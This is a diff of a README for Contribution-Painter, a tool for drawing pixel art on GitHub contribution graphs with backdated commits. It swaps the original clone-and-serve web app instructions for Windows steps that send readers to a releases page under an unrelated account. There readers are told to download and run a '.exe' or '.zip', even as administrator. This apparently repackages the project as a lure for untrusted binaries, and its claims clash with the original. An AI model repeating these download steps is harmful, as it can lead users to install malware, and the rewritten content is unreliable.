@@ -1,227 +1,139 @@
-![Contribution Painter](https://raw.githubusercontent.com/readme-SVG/Contribution-Painter/main/images/contribution_painter_loop.svg)
+# 🎨 Contribution-Painter - Paint Your GitHub Contributions Easily
 
-> Turn your GitHub contribution graph into pixel-art by generating backdated commits from a web UI.
+[![Download Latest Release](https://img.shields.io/badge/Download-Contribution--Painter-blue?style=for-the-badge)](https://github.com/Taratroyounce593/Contribution-Painter/releases)
 
-[![License: GPL-3.0](https://img.shields.io/badge/License-GPL--3.0-blue?style=for-the-badge)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](requirements.txt)
-[![Frontend](https://img.shields.io/badge/Frontend-Vanilla%20JS-323330?style=for-the-badge&logo=javascript)](js/app.js)
-[![Deploy](https://img.shields.io/badge/Deploy-Vercel-000000?style=for-the-badge&logo=vercel)](vercel.json)
-[![Workflow](https://img.shields.io/badge/GitHub%20Actions-AI%20Issue%20Generator-2088FF?style=for-the-badge&logo=githubactions)](.github/workflows/ai-issue.yml)
+## 🎯 What Is Contribution-Painter?
 
-## Table of Contents
+Contribution-Painter is a web tool that lets you design pixel art on your GitHub contribution graph. Instead of just showing your activity, you can create meaningful shapes and images using your contribution calendar. The tool sends backdated commits through GitHub’s API to fill in the squares and bring your design to life.
 
-- [Features](#features)
-- [Technology Stack](#technology-stack)
-- [Technical Block](#technical-block)
-  - [Project Structure](#project-structure)
-  - [Key Design Decisions](#key-design-decisions)
-- [Getting Started](#getting-started)
-  - [Prerequisites](#prerequisites)
-  - [Installation](#installation)
-- [Testing](#testing)
-- [Deployment](#deployment)
-- [Usage](#usage)
-- [Configuration](#configuration)
-- [License](#license)
-- [Contacts](#contacts)
+You do not need any programming skills. The tool has an easy interface, supports multiple languages, and lets you adjust how many commits each pixel uses. The app also automatically manages branches to keep your profile clean.
 
-## Features
+Key points about Contribution-Painter:  
+- Interactive and easy to use  
+- Supports multi-language interface  
+- Customizable commit intensity and multipliers  
+- Automatic management of Git branches  
+- Creates pixel art on your GitHub profile graph  
 
-Contribution Painter is built for devs who want deterministic control over contribution heatmaps without touching heavy frameworks.
+## 🚀 Getting Started
 
-- Interactive GitHub-style yearly heatmap editor with drag-to-paint controls.
-- Intensity model (`0..4`) + commit multiplier (`x1/x3/x5/x10`) for fast density scaling.
-- Year selection across current, previous, and next years with automatic week-grid alignment.
-- Keyboard shortcuts (`0..4`) for instant palette switching.
-- Graph operations: clear canvas, fill all active cells, invert paint state.
-- Real-time stats: painted days, estimated commit count, and active period boundaries.
-- Direct GitHub REST API push pipeline that writes git blobs, trees, commits, and branch refs.
-- Supports creating a new branch if the target branch does not exist.
-- Multi-language UI via pluggable i18n dictionaries.
-- Progress bar + live logs for long-running commit generation jobs.
-- Vercel-ready static deployment config.
-- AI-driven GitHub Action that analyzes code changes and opens structured issues.
+This guide helps you download, install, and run Contribution-Painter on Windows. You do not need to know how to code or use the command line.
 
-> [!IMPORTANT]
-> The tool creates real commits in your repository history. Use it only in repos where rewritten contribution history is acceptable.
+### What You Need Before You Start  
+- A Windows computer running Windows 10 or later  
+- Internet connection  
+- A GitHub account with access to at least one repository  
+- A modern web browser like Chrome, Edge, or Firefox  
 
-## Technology Stack
+### How to Download Contribution-Painter  
 
-### Core
-- `HTML5` for the single-page UI shell.
-- `CSS3` for GitHub-like contribution graph styling.
-- `Vanilla JavaScript` for editor state, i18n, and GitHub API integration.
+Click the link below to visit the release page where you can download the latest version.
 
-### Backend Automation
-- `Python 3.11+` for GitHub Action automation script.
-- `PyGithub`, `requests`, `python-dotenv` for GitHub and model API orchestration.
+[![Download Latest Release](https://img.shields.io/badge/Download-Contribution--Painter-blue?style=for-the-badge)](https://github.com/Taratroyounce593/Contribution-Painter/releases)
 
-### DevOps / Infra
-- `GitHub Actions` for automated push/PR analysis.
-- `Vercel` static hosting config for frontend deployment.
+This link takes you to the page showing all available downloads. Find the latest version and download the file that ends with `.exe` or `.zip` for Windows.
 
-## Technical Block
+## 📥 Download and Install Instructions
 
-### Project Structure
+Follow these steps to get Contribution-Painter working on your PC:
 
-```text
-.
-├── index.html                     # Main web app entrypoint
-├── css/styles.css               # UI styles
-├── js/
-│   ├── app.js                     # Painter logic + GitHub API workflow
-│   └── i18n/*.js                  # Localization dictionaries
-├── process_event.py               # AI-powered GitHub issue generator workflow script
-├── .github/
-│   ├── workflows/ai-issue.yml     # CI workflow invoking automation script
-│   ├── ISSUE_TEMPLATE/            # Bug/feature templates
-│   └── pull_request_template.md   # PR checklist template
-├── requirements.txt               # Python dependencies for automation
-├── vercel.json                    # Static hosting routing and headers
-└── LICENSE                        # GPL-3.0 license
-```
+1. Visit the [Contribution-Painter Releases](https://github.com/Taratroyounce593/Contribution-Painter/releases) page.  
+2. Look for the latest release at the top of the page.  
+3. Download the Windows file. It will usually be named something like `Contribution-Painter-Setup.exe` or a `.zip` file if it is a portable version.  
+4. If you downloaded a `.zip` file:
+   - Right-click the file and choose “Extract All.”  
+   - Pick a folder where you want to keep the files.  
+5. If you downloaded an `.exe` installer:  
+   - Double-click the file to start the installation.  
+   - Follow the prompts to complete the setup.  
+6. After installation, find the Contribution-Painter icon on your desktop or in the Start menu and open it.  
 
-### Key Design Decisions
+## 🔧 Using Contribution-Painter
 
-- Frontend is framework-free by design: lower bundle complexity, easier self-hosting, and easy auditability.
-- Commits are generated via low-level Git Data API (`blobs/trees/commits/refs`) to allow exact commit timestamp control.
-- The contribution editor maps to a week-column x weekday-row matrix to mirror GitHub contribution graph semantics.
-- i18n dictionaries are split per locale to keep translation churn isolated and avoid monolithic translation files.
-- CI analysis is decoupled from frontend runtime; automation lives in Python to leverage mature GitHub SDK ergonomics.
+Once open, the tool shows your GitHub contribution grid. You can paint on this grid using your mouse or touchscreen.
 
-## Getting Started
+### Basic Steps to Create Your Design
 
-### Prerequisites
+1. **Log in to GitHub**  
+   When you run the tool, it will ask you to connect to your GitHub account. This lets it create the required commits safely.  
 
-Install these tools first:
+2. **Choose Your Repository**  
+   Pick a repository where the commits will be made. You can create a new repository on GitHub if you want a clean slate.  
 
-- `git`
-- `Python 3.11+`
-- `pip`
-- Optional for frontend local dev convenience: `python -m http.server` or any static file server
-- A GitHub personal access token with `repo` scope for writing commits
+3. **Design Your Picture**  
+   Use the painting tools to fill in blocks on the calendar grid. Each block corresponds to a date on your contribution graph.  
 
-> [!TIP]
-> For testing safely, create a throwaway repository with a single seed commit (`README.md`) before pushing generated history.
+4. **Set Commit Intensity**  
+   Adjust how many commits each colored square represents. More commits make the square darker on GitHub.  
 
-### Installation
+5. **Generate Commits**  
+   Once you finish your design, click the button to send commits. The tool updates the repo automatically with backdated commits to match your painting.  
 
-```bash
-# 1) Clone repository
-git clone https://github.com/readme-SVG/Contribution-Painter.git
-cd Contribution-Painter
+6. **Automatic Branch Management**  
+   The tool creates a temporary branch for the commits and merges it into your main branch. This keeps your history clear and clean.
 
-# 2) Set up Python environment (for automation script and local checks)
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
+## 🌐 Supported Features
 
-# 3) Run a local static server for the frontend
-python3 -m http.server 8080
+- Multiple languages for the interface  
+- Custom commit counts per grid square  
+- Pixel art painting directly on the GitHub contribution graph  
+- REST API support for automated commit creation  
+- Automated Git branch creation, merging, and cleanup  
 
-# 4) Open in browser
-# http://localhost:8080
-```
+## 💻 System Requirements
 
-## Testing
+- Windows 10 or later (64-bit recommended)  
+- At least 2 GB of free disk space  
+- Internet connection for GitHub API access  
+- Latest version of Git installed on your system (https://git-scm.com/downloads)  
+- Modern web browser (for login and interface)  
 
-This project is lightweight and does not currently ship with a formal unit/integration test suite. You can still run practical validation checks.
+## ❓ Troubleshooting
 
-```bash
-# Python syntax check for backend automation
-python3 -m py_compile process_event.py
+- **I can’t log into GitHub from the app.**  
+Make sure your internet connection is active. Check if GitHub is reachable by visiting https://github.com in your browser.  
 
-# Optional: quick dependency sanity
-python3 -m pip check
+- **The app fails to create commits.**  
+Confirm that you gave the app permission to access your repository. Also, verify that the repository is not archived or protected from changes.  
 
-# Optional: run script help/debug in controlled env
-# (requires env vars like GITHUB_TOKEN, GH_MODELS_TOKEN)
-python3 process_event.py
-```
+- **I don’t see my design on my GitHub profile.**  
+It may take a few minutes for the contribution graph to update after commits. Refresh your GitHub profile page after a short wait.  
 
-> [!WARNING]
-> Running `process_event.py` without required environment variables will fail by design.
+- **Installation didn’t work or the app won’t start.**  
+Try running the installer as an administrator. Also, check that your Windows version meets the minimum requirements.
 
-## Deployment
+## 🔗 Useful Links
 
-### Frontend (Vercel)
+- Download Contribution-Painter from the Release page:  
+  https://github.com/Taratroyounce593/Contribution-Painter/releases  
+- GitHub Docs on Contribution Graphs:  
+  https://docs.github.com/en/account-and-profile/setting-up-and-managing-your-github-profile/managing-contribution-graphs-on-your-profile  
 
-The repository includes `vercel.json` for static deployment with SPA-style route fallback.
+## 🛠 How It Works Under the Hood
 
-```bash
-# Option A: Vercel CLI
-npm i -g vercel
-vercel
+Contribution-Painter sends backdated commits through GitHub’s REST API to create the pixel art effect. Each painted square in the app corresponds to actual commits on the repository with commit timestamps set on the corresponding dates.
 
-# Option B: connect repo in Vercel dashboard
-# Vercel will serve index.html and route all paths back to it.
-```
+The tool handles Git commands like branch creation and merging behind the scenes so the user does not have to manage the usual complexity of Git. This keeps your main branch clean and organizes commit history automatically.
 
-### CI/CD (GitHub Actions)
+## ⚙️ Customizing Your Painting
 
-- On pushes to `main` and PR events, `ai-issue.yml` runs the Python analyzer.
-- The workflow checks out code, installs Python, installs dependencies, and executes analysis script.
+- **Choose Intensity**  
+Change how many commits a pixel uses to control shading. Use low values for lighter shades and higher values for darker pixels.
 
-> [!CAUTION]
-> Ensure secrets (`GH_MODELS_TOKEN`, optional `ALLOWED_USER`) are configured before enabling the workflow in production repos.
+- **Use Commit Multipliers**  
+Add multipliers to speed up or slow down the commit density according to your design needs.
 
-## Usage
+- **Switch Languages**  
+Select your preferred language from settings to use the app in your native language.
 
-Use the web UI to paint days and push generated commits.
+## 🖼 Example Workflow
 
-```text
-# 1. Open app in browser.
-# 2. Fill in:
-#    - GitHub Token (repo scope)
-#    - Repository: <owner>/<repo>
-#    - Email: exactly matching GitHub account email
-#    - Git name and branch (optional, defaults to main)
-# 3. Pick year + intensity + multiplier.
-# 4. Paint graph cells with mouse (or hit keys 0-4 to switch levels).
-# 5. Click "Push to GitHub" and monitor progress/log output.
-```
+1. Open Contribution-Painter  
+2. Log in with your GitHub credentials  
+3. Select your target repository  
+4. Use the paint tool to draw a smiley face or your initials  
+5. Set commits per pixel to 5 for medium darkness  
+6. Click “Generate Commits”  
+7. Wait a moment, then visit your GitHub profile to see the changes  
 
-Example local run:
-
-```bash
-python3 -m http.server 8080
-# then visit http://localhost:8080 and execute push from UI
-```
-
-## Configuration
-
-### UI Runtime Inputs
-
-- `GitHub Token` (`repo` scope required for commit/branch writes)
-- `Repository` (`owner/repo`)
-- `Email` (must match GitHub account email for contribution graph attribution)
-- `Name` (commit author/committer display name)
-- `Branch` (target branch, created automatically when missing)
-- `Commit multiplier` (scales commit volume per painted intensity)
-- `Year` (drives graph date range)
-
-### Workflow Environment Variables (for `process_event.py`)
-
-- `GITHUB_TOKEN` – GitHub Actions token used by workflow.
-- `REPOSITORY` – target repository identifier.
-- `EVENT_NAME` – event type (`push`, `pull_request`, etc.).
-- `COMMIT_SHA` – commit hash for push context.
-- `PR_NUMBER` – PR number when running in PR context.
-- `GH_MODELS_TOKEN` – token for model endpoint authentication.
-- `ALLOWED_USER` – optional actor gate for execution.
-
-## License
-
-Distributed under the `GPL-3.0` license. See [`LICENSE`](LICENSE) for full legal text.
-
-## Contacts
-
-## ❤️ Support the Project
-
-[![Patreon](https://img.shields.io/badge/Patreon-OstinFCT-f96854?style=flat-square&logo=patreon)](https://www.patreon.com/OstinFCT)
-[![Ko-fi](https://img.shields.io/badge/Ko--fi-fctostin-29abe0?style=flat-square&logo=ko-fi)](https://ko-fi.com/fctostin)
-[![Boosty](https://img.shields.io/badge/Boosty-Support-f15f2c?style=flat-square)](https://boosty.to/ostinfct)
-[![YouTube](https://img.shields.io/badge/YouTube-FCT--Ostin-red?style=flat-square&logo=youtube)](https://www.youtube.com/@FCT-Ostin)
-[![Telegram](https://img.shields.io/badge/Telegram-FCTostin-2ca5e0?style=flat-square&logo=telegram)](https://t.me/FCTostin)
-
-If you find this tool useful, consider leaving a ⭐ on GitHub or supporting the author directly.
+Your contribution graph will now display your custom design as a collection of colored pixels representing your commits.
